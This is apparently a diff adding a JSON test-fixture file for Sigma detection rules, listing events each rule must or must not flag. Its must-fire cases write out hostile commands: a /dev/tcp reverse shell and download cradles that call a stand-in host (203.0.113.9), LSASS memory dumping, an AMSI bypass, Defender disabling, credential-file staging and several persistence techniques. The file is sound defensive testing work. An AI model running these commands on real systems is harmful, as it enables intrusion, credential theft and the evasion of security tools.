@@ -1,0 +1,1223 @@
+[
+  {
+    "id": "sigma_credential_access",
+    "file": "rules/sigma/credential_access.yml",
+    "must_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "cat",
+          "file_path": "/etc/shadow",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "python3",
+          "file_path": "/etc/shadow",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "cp",
+          "file_path": "/etc/gshadow",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "perl",
+          "file_path": "/etc/shadow"
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "python3.11",
+          "file_path": "/etc/shadow"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "unix_chkpwd",
+          "file_path": "/etc/shadow",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "sshd",
+          "file_path": "/etc/shadow",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "ssh",
+          "file_path": "/home/alice/.ssh/id_ed25519",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "cat",
+          "file_path": "/home/alice/.ssh/id_ed25519.pub",
+          "file_write": false
+        }
+      ]
+    ]
+  },
+  {
+    "id": "sigma_credential_access_sshkey",
+    "file": "rules/sigma/credential_access_ssh_private_key.yml",
+    "must_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "python3",
+          "file_path": "/home/alice/.ssh/id_rsa",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "curl",
+          "file_path": "/root/.ssh/id_ed25519",
+          "file_write": false
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "ssh",
+          "file_path": "/home/alice/.ssh/id_ed25519",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "git",
+          "file_path": "/home/alice/.ssh/id_rsa",
+          "file_write": false
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "cat",
+          "file_path": "/home/alice/.ssh/id_ed25519.pub",
+          "file_write": false
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_data_staging_archive",
+    "file": "rules/sigma/linux_data_staging_archive.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "tar",
+          "cmdline": "tar -czf /tmp/loot.tgz /home/alice/.ssh /etc/shadow",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "zip",
+          "cmdline": "zip -r /dev/shm/k.zip /root/.aws/credentials /root/.kube/config",
+          "parent": "bash"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "tar",
+          "cmdline": "tar -czf /var/backups/home.tgz /home/alice",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "gzip",
+          "cmdline": "gzip -9 /var/log/app.log.1",
+          "parent": "logrotate"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "zip",
+          "cmdline": "zip -r site.zip /var/www/html",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "tar",
+          "cmdline": "tar -czf /var/backups/package-db.tgz /var/lib/dpkg",
+          "parent": "dpkg-db-backup"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_ld_preload_defense_evasion",
+    "file": "rules/sigma/linux_ld_preload_defense_evasion.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "cmdline": "sh -c 'LD_PRELOAD=/tmp/evil.so /usr/bin/ls'",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -c 'echo /dev/shm/x.so > /etc/ld.so.preload'",
+          "parent": "bash"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "cmdline": "sh -c 'LD_LIBRARY_PATH=/opt/oracle/lib sqlplus'",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "env",
+          "cmdline": "env LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libjemalloc.so.2 redis-server",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "steam",
+          "cmdline": "sh -c LD_PRELOAD=/usr/lib/steam/gameoverlayrenderer.so steam",
+          "parent": "bash"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_reverse_shell_devtcp",
+    "file": "rules/sigma/linux_reverse_shell_devtcp.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -c 'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "cmdline": "sh -c '0<&196;exec 196<>/dev/tcp/203.0.113.9/4444; sh <&196 >&196 2>&196'",
+          "parent": "bash"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -c 'echo > /dev/tcp/db/5432'",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -i",
+          "parent": "dockerd"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -c 'cat < /dev/tcp/127.0.0.1/80'",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "cmdline": "bash -c 'cat <&0 >&1'"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_ssh_lateral_movement",
+    "file": "rules/sigma/linux_ssh_lateral_movement.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "ssh",
+          "cmdline": "ssh -i /tmp/k root@10.0.0.7",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "ssh",
+          "cmdline": "ssh -fN -R 0.0.0.0:8080:localhost:22 attacker@203.0.113.9",
+          "parent": "bash"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "ssh",
+          "cmdline": "ssh -i /home/alice/.ssh/deploy alice@10.0.0.5",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "scp",
+          "cmdline": "scp report.pdf alice@10.0.0.5:/tmp/",
+          "parent": "bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "ssh",
+          "cmdline": "ssh git@github.com",
+          "parent": "bash"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_certutil_download",
+    "file": "rules/sigma/windows_certutil_download.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil.exe -urlcache -split -f http://203.0.113.9/a.exe a.exe",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil /urlcache /f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -hashfile C:\\x.iso SHA256",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c echo certutil -urlcache is blocked by policy",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -dump cert.cer",
+          "parent": "cmd.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_certutil_decode",
+    "file": "rules/sigma/windows_certutil_decode.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -decode C:\\Users\\Public\\p.txt C:\\Users\\Public\\p.exe",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -encode cert.der cert.pem",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -hashfile setup.exe SHA256",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "expected_level": "medium"
+  },
+  {
+    "id": "windows_com_hijack_registry",
+    "file": "rules/sigma/windows_com_hijack_registry.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32 /ve /d C:\\Users\\u\\AppData\\x.dll /f",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg query HKCR\\CLSID\\{00021401-0000-0000-C000-000000000046}\\InprocServer32",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Vendor /v Theme /t REG_DWORD /d 1 /f",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg query HKCU\\Software\\Classes\\CLSID\\{synthetic}\\InprocServer32"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_csc_lolbin",
+    "file": "rules/sigma/windows_csc_lolbin.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "csc.exe",
+          "cmdline": "csc.exe /out:C:\\Users\\Public\\x.exe C:\\Users\\Public\\x.cs",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "csc.exe",
+          "cmdline": "\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\" /noconfig /fullpaths @\"C:\\Users\\u\\AppData\\Local\\Temp\\x.cmdline\"",
+          "parent": "powershell.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "csc.exe",
+          "cmdline": "csc.exe /out:bin\\Release\\App.exe Program.cs",
+          "parent": "msbuild.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_defender_disable",
+    "file": "rules/sigma/windows_defender_disable.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell Set-MpPreference -DisableRealtimeMonitoring 1",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe Get-MpPreference",
+          "parent": "explorer.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_ifeo_debugger_persistence",
+    "file": "rules/sigma/windows_ifeo_debugger_persistence.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Vendor /v Theme /t REG_DWORD /d 1 /f",
+          "parent": "cmd.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_installutil_lolbin",
+    "file": "rules/sigma/windows_installutil_lolbin.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "installutil.exe",
+          "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\p.dll",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "installutil.exe",
+          "cmdline": "InstallUtil.exe /logfile= /u C:\\Users\\Public\\payload.dll"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "installutil.exe",
+          "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe \"C:\\Program Files\\Vendor\\VendorSvc.exe\"",
+          "parent": "msiexec.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c installutil.exe /u \"C:\\Program Files\\Vendor\\VendorSvc.exe\"",
+          "parent": "msiexec.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_lateral_movement_service_exec",
+    "file": "rules/sigma/windows_lateral_movement_service_exec.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c whoami",
+          "parent": "psexesvc.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "psexec.exe",
+          "cmdline": "PsExec.exe \\\\srv01 -accepteula ipconfig",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c ipconfig /all",
+          "parent": "explorer.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_lsass_access_dump",
+    "file": "rules/sigma/windows_lsass_access_dump.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "rundll32.exe",
+          "cmdline": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "rundll32.exe",
+          "cmdline": "rundll32.exe comsvcs.dll,MiniDump 624 C:\\temp\\l.dmp full",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "procdump64.exe",
+          "cmdline": "procdump64.exe -accepteula -ma lsass.exe C:\\temp\\l.dmp",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "rundll32.exe",
+          "cmdline": "C:\\Windows\\system32\\rundll32.exe shell32.dll,Control_RunDLL",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "procdump.exe",
+          "cmdline": "procdump.exe -ma w3wp.exe C:\\dumps\\w3wp.dmp",
+          "parent": "cmd.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_msbuild_lolbin",
+    "file": "rules/sigma/windows_msbuild_lolbin.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Users\\Public\\payload.xml",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "MSBuild.exe C:\\Users\\Public\\payload.csproj"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "\"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe\" App.sln /m",
+          "parent": "devenv.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "MSBuild.exe /nologo /nodemode:1 /nodeReuse:true",
+          "parent": "msbuild.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "msbuild.exe",
+          "cmdline": "msbuild.exe build.xml"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_mshta_lolbin_download",
+    "file": "rules/sigma/windows_mshta_lolbin_download.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "mshta.exe",
+          "cmdline": "mshta http://203.0.113.9/a.hta",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "mshta.exe",
+          "cmdline": "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell\"\"\")(window.close)",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "mshta.exe",
+          "cmdline": "mshta.exe \"C:\\Program Files\\Vendor\\help\\index.hta\"",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c start mshta.exe C:\\ProgramData\\Vendor\\ui.hta",
+          "parent": "explorer.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_registry_runkey_persistence",
+    "file": "rules/sigma/windows_registry_runkey_persistence.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Users\\u\\AppData\\x.exe /f",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Upd -Value 'C:\\Users\\Public\\x.exe'"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd.exe /c route add 10.10.0.0 mask 255.255.0.0 10.0.0.1",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Vendor /v Theme /t REG_DWORD /d 1 /f",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /d 1 /f"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runtime /v Theme /d 1 /f"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_taskkill_eguard_tamper",
+    "file": "rules/sigma/windows_taskkill_eguard_tamper.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "taskkill.exe",
+          "cmdline": "taskkill /f /im eguard-agent.exe",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "sc.exe",
+          "cmdline": "sc.exe stop eguard-agent",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe -Command Get-Service eguard-agent",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "sc.exe",
+          "cmdline": "sc.exe query eguard-agent",
+          "parent": "cmd.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_uac_bypass_signals",
+    "file": "rules/sigma/windows_uac_bypass_signals.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "fodhelper.exe",
+          "cmdline": "C:\\Windows\\System32\\fodhelper.exe",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg add HKCU\\Software\\Vendor /v Theme /t REG_DWORD /d 1 /f",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "reg.exe",
+          "cmdline": "reg query HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_wmi_event_subscription_persistence",
+    "file": "rules/sigma/windows_wmi_event_subscription_persistence.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "wmic.exe",
+          "cmdline": "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"x\",EventNameSpace=\"root\\cimv2\"",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe Get-WmiObject -Namespace root\\subscription -Class __EventFilter",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer",
+          "parent": "explorer.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_amsi_bypass_reflection",
+    "file": "rules/sigma/windows_amsi_bypass_reflection.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "Get-MpComputerStatus"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_bits_notifycmdline_persistence",
+    "file": "rules/sigma/windows_bits_notifycmdline_persistence.yml",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "bitsadmin.exe",
+          "cmdline": "bitsadmin /SetNotifyCmdLine job1 C:\\Users\\Public\\x.exe NULL"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "bitsadmin.exe",
+          "cmdline": "bitsadmin /list /allusers"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_certutil_encode",
+    "file": "rules/sigma/windows_certutil_encode.yml",
+    "expected_level": "low",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -encode cert.der cert.pem"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "certutil.exe",
+          "cmdline": "certutil -encodehex input.bin output.txt"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "cmd.exe",
+          "cmdline": "cmd /c certutil -encode cert.der cert.pem"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c certutil -encode cert.der cert.pem"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_download_exec",
+    "file": "rules/sigma/linux_download_exec.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "cmdline": "sh -c 'curl -s http://203.0.113.9/x.sh | bash'"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "sh",
+          "parent": "bash",
+          "cmdline": "sh -c 'curl https://sh.rustup.rs -sSf | sh'"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "curl",
+          "parent": "cron",
+          "cmdline": "curl https://hc-ping.example/uuid"
+        },
+        {
+          "class": "process_exec",
+          "process": "bash",
+          "parent": "sshd",
+          "cmdline": "/bin/bash /home/synthetic/deploy.sh"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "curl",
+          "cmdline": "curl -O https://releases.example.org/tool.tgz"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_persistence_cron_systemd",
+    "file": "rules/sigma/linux_persistence_cron_systemd.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "file_open",
+          "process": "bash",
+          "file_path": "/etc/cron.d/upd",
+          "file_write": true,
+          "cmdline": "bash -c 'echo curl http://203.0.113.9/x | sh > /etc/cron.d/upd'"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "systemctl",
+          "cmdline": "systemctl enable --now docker"
+        }
+      ],
+      [
+        {
+          "class": "file_open",
+          "process": "dpkg",
+          "file_path": "/etc/cron.d/sysstat",
+          "file_write": true
+        }
+      ]
+    ]
+  },
+  {
+    "id": "windows_powershell_download_cradle",
+    "file": "rules/sigma/windows_powershell_download_cradle.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')\"",
+          "parent": "cmd.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell -c \"iwr http://203.0.113.9/a.ps1 -UseBasicParsing | iex\"",
+          "parent": "cmd.exe"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe -c (New-Object Net.WebClient).DownloadString('https://api.ipify.org')",
+          "parent": "explorer.exe"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "powershell.exe",
+          "cmdline": "powershell.exe -c Invoke-WebRequest https://vendor.example/tool.zip -OutFile C:\\Temp\\tool.zip",
+          "parent": "explorer.exe"
+        }
+      ]
+    ]
+  },
+  {
+    "id": "linux_setuid_setgid_writable_path",
+    "file": "rules/sigma/linux_setuid_setgid_writable_path.yml",
+    "expected_level": "medium",
+    "must_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod u+s /tmp/bash"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod 4755 /dev/shm/x"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod g+s /var/tmp/y"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod a+sx /home/synthetic/x"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod 2750 /run/user/1000/x"
+        }
+      ]
+    ],
+    "must_not_fire": [
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod u+s /usr/local/bin/tool"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod 755 /tmp/x"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod 1777 /tmp/d"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod 04755 /tmp/x"
+        }
+      ],
+      [
+        {
+          "class": "process_exec",
+          "process": "chmod",
+          "cmdline": "chmod u+s /homebackup/x"
+        }
+      ]
+    ]
+  }
+]
